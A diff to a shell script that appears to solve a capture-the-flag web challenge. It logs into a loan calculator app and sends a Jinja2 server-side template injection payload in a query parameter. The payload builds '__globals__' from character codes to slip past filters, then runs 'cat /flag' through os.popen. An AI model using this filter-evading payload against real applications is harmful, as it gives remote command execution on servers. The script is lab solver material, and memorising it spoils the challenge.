@@ -9,10 +9,10 @@ set -uo pipefail
 URL="${1:?usage: $0 http://127.0.0.1:PORT}"
 SESSION="xben063p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
 proxy_start "$URL/"; go "$URL/"; BASE="$(req_of GET /)"
-"$H5I" websec replay "$BASE" --create --session "$SESSION" \
+"$H5I" websec replay "$BASE" --create --session "$SESSION" --as "$SESSION" \
   --set 'method=POST' --set 'path=/login' --set 'form.username=test' --set 'form.password=test' >/dev/null 2>&1 || true
 PAYLOAD='1" ,"d": "{%set u="%c"|format(95)%}{%set g=u~u~"globals"~u~u%}{%set o=lipsum|attr(g)|attr("get")("os")%}{%print(o|attr("popen")("cat /flag")|attr("read")()|urlencode)%}'
-out="$("$H5I" websec replay "$BASE" --create --session "$SESSION" \
+out="$("$H5I" websec replay "$BASE" --create --session "$SESSION" --as "$SESSION" \
   --set 'method=GET' --set 'path=/total_loan_payments' \
   --set "query.principal=$PAYLOAD" --set 'query.payment=212.47' --set 'query.term=60' 2>/dev/null)"
 # The flag is url-encoded in the injected JSON key; pull it out and decode it.
